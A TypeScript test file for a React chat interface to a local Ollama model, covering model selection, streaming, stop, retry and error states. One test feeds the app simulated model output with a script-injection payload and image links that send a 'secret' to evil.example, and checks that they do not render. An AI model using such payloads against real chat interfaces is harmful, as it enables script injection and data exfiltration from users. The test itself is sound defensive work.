import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it } from "vitest";
import { App } from "./app";
import {
  controlledStream,
  installFetch,
  json,
  model,
  modelList,
  overview,
  sse,
  streamResponse,
} from "./test/fake-api";

const MODELS = [model("llama3.2:1b"), model("qwen2.5:0.5b", { isDefault: true }), model("glm-5:cloud", { isRemote: true, isAvailable: false, sizeBytes: null })];

function baseRoutes() {
  return {
    "GET /api/system/overview": () => json(overview()),
    "GET /api/models": () => json(modelList(MODELS)),
  };
}

async function typeAndSend(text: string) {
  const user = userEvent.setup();
  const box = await screen.findByLabelText("Message");
  await waitFor(() => expect(box).toBeEnabled());
  await user.type(box, text);
  await user.click(screen.getByRole("button", { name: "Send" }));
  return user;
}

describe("App", () => {
  beforeEach(() => {
    window.location.hash = "#/chat";
  });

  it("loads installed models and preselects the configured default", async () => {
    installFetch(baseRoutes());
    render(<App />);

    const select = await screen.findByLabelText("Model");
    await waitFor(() => expect(select).toHaveValue("qwen2.5:0.5b"));
    const options = within(select).getAllByRole("option");
    expect(options.map((o) => o.textContent)).toEqual([
      "llama3.2:1b · 494M",
      "qwen2.5:0.5b · 494M",
      "glm-5:cloud (remote — disabled)",
    ]);
    expect(options[2]).toBeDisabled();
  });

  it("explains how to install a model when none is available and blocks sending", async () => {
    installFetch({
      "GET /api/system/overview": () => json(overview({ usable: 0 })),
      "GET /api/models": () => json(modelList([])),
    });
    render(<App />);

    expect(await screen.findByText("No model installed", { selector: ".notice__title" })).toBeInTheDocument();
    expect(screen.getByText("docker compose exec ollama ollama pull qwen2.5:0.5b")).toBeInTheDocument();
    expect(screen.getByLabelText("Message")).toBeDisabled();
  });

  it("shows a provider-unavailable state", async () => {
    installFetch({
      "GET /api/system/overview": () => json(overview({ reachable: false })),
      "GET /api/models": () =>
        json({ status: 503, detail: "The local inference service is not reachable.", code: "provider_unavailable", retryable: true }, 503),
    });
    render(<App />);

    expect(await screen.findByText("Ollama is not reachable")).toBeInTheDocument();
    expect(screen.getByLabelText("Message")).toBeDisabled();
  });

  it("sends a message and renders streamed text incrementally", async () => {
    let stream!: ReturnType<typeof controlledStream>;
    const api = installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": (init) => {
        stream = controlledStream(init?.signal);
        return stream.response;
      },
    });
    render(<App />);
    await waitFor(() => expect(screen.getByLabelText("Model")).toHaveValue("qwen2.5:0.5b"));

    await typeAndSend("Explain SSE");

    expect(screen.getByText("Explain SSE")).toBeInTheDocument();
    const sent = JSON.parse(api.callsTo("POST /api/chat/stream")[0]!.init!.body as string);
    expect(sent).toEqual({ model: "qwen2.5:0.5b", messages: [{ role: "user", content: "Explain SSE" }] });

    await act(async () => stream.push(sse("start", { requestId: "r", model: "qwen2.5:0.5b", createdAt: "" }) + sse("delta", { content: "Server-Sent " })));
    expect(await screen.findByText(/Server-Sent/)).toBeInTheDocument();
    expect(screen.getByText("Streaming")).toBeInTheDocument();

    await act(async () => stream.push(sse("delta", { content: "**Events**" })));
    expect(await screen.findByText("Events", { selector: "strong" })).toBeInTheDocument();

    await act(async () => {
      stream.push(sse("done", { finishReason: "stop", stats: { completionTokens: 3, tokensPerSecond: 12.5, totalDurationMs: 900, promptTokens: 5, loadDurationMs: 10, generationDurationMs: 240 } }));
      stream.close();
    });
    expect(await screen.findByText("3 tokens · 12.5 tok/s · 900 ms")).toBeInTheDocument();
    expect(screen.queryByText("Streaming")).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Copy response" })).toBeInTheDocument();
  });

  it("prevents duplicate submissions while a generation is running", async () => {
    const api = installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": (init) => controlledStream(init?.signal).response,
    });
    render(<App />);

    const user = await typeAndSend("first");
    const box = screen.getByLabelText("Message");
    await user.type(box, "second{Enter}");

    expect(screen.queryByRole("button", { name: "Send" })).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Stop" })).toBeInTheDocument();
    expect(api.callsTo("POST /api/chat/stream")).toHaveLength(1);
  });

  it("stops a generation, aborts the request and keeps the partial text", async () => {
    let stream!: ReturnType<typeof controlledStream>;
    let signal: AbortSignal | null | undefined;
    installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": (init) => {
        signal = init?.signal;
        stream = controlledStream(signal);
        return stream.response;
      },
    });
    render(<App />);

    const user = await typeAndSend("Count to 100");
    await act(async () => stream.push(sse("delta", { content: "1, 2, 3" })));
    expect(await screen.findByText("1, 2, 3")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Stop" }));

    expect(signal?.aborted).toBe(true);
    expect(await screen.findByText(/Generation stopped; partial response kept/)).toBeInTheDocument();
    expect(screen.getByText("1, 2, 3")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Send" })).toBeInTheDocument();
  });

  it("shows a failed request and retries it successfully", async () => {
    let attempt = 0;
    const api = installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": () => {
        attempt += 1;
        return attempt === 1
          ? json({ status: 503, title: "Inference provider unavailable", detail: "The local inference service is not reachable.", code: "provider_unavailable", retryable: true }, 503)
          : streamResponse(sse("delta", { content: "Recovered" }), sse("done", { finishReason: "stop", stats: null }));
      },
    });
    render(<App />);

    const user = await typeAndSend("Hello");

    const alert = await screen.findByText("Generation failed.");
    expect(alert.closest("[role=alert]")).toHaveTextContent("The local inference service is not reachable.");
    await user.click(screen.getByRole("button", { name: "Retry" }));

    expect(await screen.findByText("Recovered")).toBeInTheDocument();
    expect(screen.queryByText("Generation failed.")).not.toBeInTheDocument();
    const retryBody = JSON.parse(api.callsTo("POST /api/chat/stream")[1]!.init!.body as string);
    expect(retryBody.messages).toEqual([{ role: "user", content: "Hello" }]);
  });

  it("keeps partial text when the stream fails midway", async () => {
    installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": () =>
        streamResponse(
          sse("delta", { content: "Partial answer" }),
          sse("error", { code: "provider_timeout", message: "The inference service did not respond within 300 seconds.", retryable: true }),
        ),
    });
    render(<App />);

    await typeAndSend("Long task");

    expect(await screen.findByText(/did not respond within 300 seconds/)).toBeInTheDocument();
    expect(screen.getByText("Partial answer")).toBeInTheDocument();
    expect(screen.getByText("provider_timeout")).toBeInTheDocument();
  });

  it("does not render HTML or load images from model output", async () => {
    installFetch({
      ...baseRoutes(),
      "POST /api/chat/stream": () =>
        streamResponse(
          sse("delta", { content: 'Hi <script>window.__pwned = true</script><img src="https://evil.example/x?d=secret"> ![leak](https://evil.example/p.png)' }),
          sse("done", { finishReason: "stop", stats: null }),
        ),
    });
    const { container } = render(<App />);

    await typeAndSend("test");

    expect(await screen.findByText(/image not loaded: leak/)).toBeInTheDocument();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((window as { __pwned?: boolean }).__pwned).toBeUndefined();
  });
});
